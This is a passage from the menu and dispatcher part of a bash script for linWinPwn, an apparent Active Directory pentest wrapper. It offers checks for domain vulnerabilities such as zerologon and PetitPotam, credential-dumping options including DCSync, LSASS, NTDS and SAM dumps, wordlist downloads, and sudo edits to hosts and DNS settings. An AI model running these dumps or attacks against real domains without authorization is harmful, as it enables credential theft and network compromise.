    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) ALL VULNERABILITY CHECKS"
    echo -e "m) Modify target(s)"
    echo -e "1) NoPac check using crackmapexec (only on DC)"
    echo -e "2) PetitPotam check using crackmapexec (only on DC)"
    echo -e "3) dfscoerce check using crackmapexec (only on DC)"
    echo -e "4) zerologon check using crackmapexec (only on DC)"
    echo -e "5) MS14-068 check (only on DC)"
    echo -e "6) MS17-010 check using crackmapexec"
    echo -e "7) Print Spooler check using crackmapexec"
    echo -e "8) WebDAV check using crackmapexec"
    echo -e "9) shadowcoerce check using crackmapexec"
    echo -e "10) SMB signing check using crackmapexec"
    echo -e "11) ntlmv1 check using crackmapexec"
    echo -e "12) runasppl check using crackmapexec"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        vuln_checks
        vulns_menu
        ;;

        m)
        modify_target
        vulns_menu
        ;;
        
        1)
        nopac_check
        vulns_menu
        ;;

        2)
        petitpotam_check
        vulns_menu
        ;;

        3)
        dfscoerce_check
        vulns_menu
        ;;

        4)
        zerologon_check
        vulns_menu
        ;;

        5)
        ms14-068_check
        vulns_menu
        ;;
        
        6)
        ms17-010_check
        vulns_menu
        ;;

        7)
        spooler_check
        vulns_menu
        ;;

        8)
        webdav_check
        vulns_menu
        ;;

        9)
        shadowcoerce_check
        vulns_menu
        ;;

        10)
        smbsigning_check
        vulns_menu
        ;;

        11)
        ntlmv1_check
        vulns_menu
        ;;

        12)
        runasppl_check
        vulns_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        vulns_menu
        ;;
    esac
}

pwd_menu () {
    echo -e ""
    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) ALL PASSWORD DUMPS"
    echo -e "m) Modify target(s)"
    echo -e "1) LAPS Dump using crackmapexec"
    echo -e "2) gMSA Dump using crackmapexec"
    echo -e "3) DCSync using secretsdump (only on DC)"
    echo -e "4) Dump SAM and LSA using secretsdump"
    echo -e "5) Dump NTDS using crackmapexec"
    echo -e "6) Dump SAM using crackmapexec"
    echo -e "7) Dump LSA secrets using crackmapexec"
    echo -e "8) Dump LSASS using lsassy"
    echo -e "9) Dump LSASS using handlekatz"
    echo -e "10) Dump LSASS using procdump"
    echo -e "11) Dump LSASS using nanodump"
    echo -e "12) Dump LSASS using masky (ADCS required)"
    echo -e "13) Dump secrets using DonPAPI"
    echo -e "14) Dump NTDS using certsync (ADCS required) (only on DC)"
    echo -e "15) Dump secrets using hekatomb (only on DC)"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        pwd_dump
        pwd_menu
        ;;

        m)
        modify_target
        pwd_menu
        ;;

        1)
        laps_dump
        pwd_menu
        ;;

        2)
        gmsa_dump
        pwd_menu
        ;;

        3)
        secrets_dump_dcsync
        pwd_menu
        ;;

        4)
        secrets_dump
        pwd_menu
        ;;

        5)
        ntds_dump
        pwd_menu
        ;;

        6)
        sam_dump
        pwd_menu
        ;;

        7)
        lsa_dump
        pwd_menu
        ;;

        8)
        lsassy_dump
        pwd_menu
        ;;

        9)
        handlekatz_dump
        pwd_menu
        ;;

        10)
        procdump_dump
        pwd_menu
        ;;

        11)
        nanodump_dump
        pwd_menu
        ;;

        12)
        masky_dump
        pwd_menu
        ;;

        13)
        donpapi_dump
        pwd_menu
        ;;

        14)
        certsync_ntds_dump
        pwd_menu
        ;;

        15)
        hekatomb_dump
        pwd_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        pwd_menu
        ;;
    esac
}

config_menu () {
    echo -e ""
    echo -e "${YELLOW}[Config menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------"
    echo -e "ENTER) Go to Main Menu"
    echo -e "1) Check installation of tools and dependencies"
    echo -e "2) Change output folder"
    echo -e "3) Synchronize time with Domain Controller (requires root)"
    echo -e "4) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
    echo -e "5) Update resolv.conf to define Domain Controller as DNS server (requires root)"
    echo -e "6) Switch between LDAP (port 389) and LDAPS (port 636)"
    echo -e "7) Download default username and password wordlists (non-kali machines)"
    echo -e "8) Change users wordlist file"
    echo -e "9) Change passwords wordlist file"
    echo -e "10) Show session information"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        1)
        echo -e ""
        if [ ! -f "${impacket_findDelegation}" ] ; then echo -e "${RED}[-] impacket's findDelegation is not installed${NC}"; else echo -e "${GREEN}[+] impacket's findDelegation is installed${NC}"; fi
        if [ ! -f "${impacket_GetUserSPNs}" ] ; then echo -e "${RED}[-] impacket's GetUserSPNs is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetUserSPNs is installed${NC}"; fi
        if [ ! -f "${impacket_secretsdump}" ] ; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
        if [ ! -f "${impacket_GetNPUsers}" ] ; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
        if [ ! -f "${impacket_getTGT}" ] ; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
        if [ ! -f "${impacket_goldenPac}" ] ; then echo -e "${RED}[-] impacket's goldenPac is not installed${NC}"; else echo -e "${GREEN}[+] impacket's goldenPac is installed${NC}"; fi
        if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
        if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
        if [ ! -f "${crackmapexec}" ] ; then echo -e "${RED}[-] crackmapexec is not installed${NC}"; else echo -e "${GREEN}[+] crackmapexec is installed${NC}"; fi
        if [ ! -f "${john}" ] ; then echo -e "${RED}[-] john is not installed${NC}"; else echo -e "${GREEN}[+] john is installed${NC}"; fi
        if [ ! -f "${smbmap}" ] ; then echo -e "${RED}[-] smbmap is not installed${NC}"; else echo -e "${GREEN}[+] smbmap is installed${NC}"; fi
        if [ ! -f "${nmap}" ] ; then echo -e "${RED}[-] nmap is not installed${NC}"; else echo -e "${GREEN}[+] nmap is installed${NC}"; fi
        if [ ! -f "${adidnsdump}" ] ; then echo -e "${RED}[-] adidnsdump is not installed${NC}"; else echo -e "${GREEN}[+] adidnsdump is installed${NC}"; fi
        if [ ! -f "${certi_py}" ] ; then echo -e "${RED}[-] certi_py is not installed${NC}"; else echo -e "${GREEN}[+] certi_py is installed${NC}"; fi
        if [ ! -f "${certipy}" ] ; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
        if [ ! -f "${ldeep}" ] ; then echo -e "${RED}[-] ldeep is not installed${NC}"; else echo -e "${GREEN}[+] ldeep is installed${NC}"; fi
        if [ ! -f "${pre2k}" ] ; then echo -e "${RED}[-] pre2k is not installed${NC}"; else echo -e "${GREEN}[+] pre2k is installed${NC}"; fi
        if [ ! -f "${certsync}" ] ; then echo -e "${RED}[-] certsync is not installed${NC}"; else echo -e "${GREEN}[+] certsync is installed${NC}"; fi
        if [ ! -f "${windapsearch}" ] ; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
        if [ ! -x "${windapsearch}" ] ; then echo -e "${RED}[-] windapsearch is not executable${NC}"; else echo -e "${GREEN}[+] windapsearch is executable${NC}"; fi
        if [ ! -f "${enum4linux_py}" ] ; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
        if [ ! -x "${enum4linux_py}" ] ; then echo -e "${RED}[-] enum4linux-ng is not executable${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is executable${NC}"; fi
        if [ ! -f "${kerbrute}" ] ; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
        if [ ! -x "${kerbrute}" ] ; then echo -e "${RED}[-] kerbrute is not executable${NC}"; else echo -e "${GREEN}[+] kerbrute is executable${NC}"; fi
        if [ ! -f "${targetedKerberoast}" ] ; then echo -e "${RED}[-] targetedKerberoast is not installed${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is installed${NC}"; fi
        if [ ! -x "${targetedKerberoast}" ] ; then echo -e "${RED}[-] targetedKerberoast is not executable${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is executable${NC}"; fi
        if [ ! -f "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
        if [ ! -x "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not executable${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is executable${NC}"; fi
        if [ ! -f "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
        if [ ! -x "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not executable${NC}"; else echo -e "${GREEN}[+] DonPAPI is executable${NC}"; fi
        if [ ! -f "${hekatomb}" ] ; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
        config_menu
        ;;

        2)
        echo -e ""
        echo -e "Please specify new output folder:"
        read -p ">> " output_dir_new </dev/tty
        if [ ! "${output_dir_new}" == "" ]; then
            mkdir -p $output_dir_new 2>/dev/null
            output_dir=$output_dir_new
            echo -e "${GREEN}[+] Output folder updated${NC}"
        else
            echo -e "${RED}[-] Error updating output folder${NC}"
        fi
        config_menu
        ;;

        3)
        echo -e ""
        sudo timedatectl set-ntp 0
        sudo ntpdate ${dc_ip}
        echo -e "${GREEN}[+] NTP sync complete${NC}"
        config_menu
        ;;

        4)
        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
        config_menu
        ;;

        5)
        echo -e ""
        echo -e "Content of /etc/resolv.conf before update:"
        echo -e "------------------------------------------"
        cat /etc/resolv.conf
        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
        echo -e "${GREEN}[+] DNS update complete${NC}"
        config_menu
        ;;

        6)
        if [ "${ldaps_bool}" == false ]; then
            ldaps_bool=true
            echo -e "${GREEN}[+] Switched to using LDAPS on port 636${NC}"

        else
            ldaps_bool=false
            echo -e "${GREEN}[+] Switched to using LDAP on port 389${NC}"
        fi
        config_menu
        ;;

        7)
        echo -e ""
        sudo mkdir -p ${wordlists_dir} 
        sudo chown -R $(whoami) ${wordlists_dir}
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -O "${wordlists_dir}/rockyou.txt.tar.gz"
        gunzip "${wordlists_dir}/rockyou.txt.tar.gz"
        tar xf "${wordlists_dir}/rockyou.txt.tar" -C "${wordlists_dir}/"
        chmod 644 "${wordlists_dir}/rockyou.txt"
        /bin/rm "${wordlists_dir}/rockyou.txt.tar"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "${wordlists_dir}/cirt-default-usernames.txt"
        pass_list="${wordlists_dir}/rockyou.txt"
        users_list="${wordlists_dir}/xato-net-10-million-usernames.txt"
        echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
        config_menu
        ;;

        8)
        echo -e "Please specify new users wordlist file:"
        read -p ">> " users_list </dev/tty
        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
        config_menu
        ;;

        9)
        echo -e "Please specify new passwords wordlist file:"
        read -p ">> " pass_list </dev/tty
        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
        config_menu
        ;;

        10)
        echo ""
        print_info
        config_menu
        ;;

        "")
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        config_menu
        ;;
    esac
}

main_menu () {
    echo -e ""
    echo -e "${PURPLE}[Main menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "C) Configuration Menu"
    echo -e "1) Re-run DNS Enumeration using adidnsdump"
    echo -e "2) Active Directory Enumeration Menu"
    echo -e "3) Kerberos Attacks Menu"
    echo -e "4) SMB shares Enumeration Menu"
    echo -e "5) Vulnerability Checks Menu"
    echo -e "6) Password Dump Menu"
    echo -e "7) Run MSSQL Enumeration"
    echo -e "99) Quit"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        C)
        config_menu
        ;;

        1)
        /bin/rm ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
        dns_enum
        main_menu
        ;;

        2)
        ad_menu
        ;;

        3)
        kerberos_menu
        ;;

        4)
        shares_menu
        ;;

        5)
        vulns_menu
        ;;

        6)
        pwd_menu
        ;;

        7)
        mssql_enum
        main_menu
        ;;

        99)
        exit 1
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main () { 
    print_banner
    prepare
    print_info
    echo -e ""
    dns_enum

    if [[ "$modules" == *"interactive"* ]]; then
        modules="interactive"
        config_menu
    elif [[ "$modules" == "" ]]; then
        echo -e "${RED}[-] No modules specified${NC}"
        echo -e "Use -h for help"
        exit 1
    else
        for i in $(echo $modules | sed "s/,/ /g"); do
            case $i in
                ad_enum)
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e ""
                ;;

                kerberos)
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e ""
                ;;

                scan_shares)
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                ;;

                pwd_dump)
                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
                echo -e "${GREEN}---------------------------------${NC}"
                echo -e ""
                pwd_dump
                ;;

                mssql_enum)
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                echo -e ""
                ;;

                vuln_checks)
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e ""
                ;;

                all)
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
                echo -e "${GREEN}---------------------------------${NC}"
                echo -e ""
                pwd_dump
                ;;

                user)
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                ;;

                *)
                echo -e "${RED}[-] Unknown module $i... ${NC}"
                echo -e ""
                ;;
            esac
        done

        echo -e ""
        echo -e "${GREEN}[+] All modules have completed. Output folder is: ${output_dir}${NC}"
        echo -e "${GREEN}-------------------------------------------------${NC}"

    fi
}

main
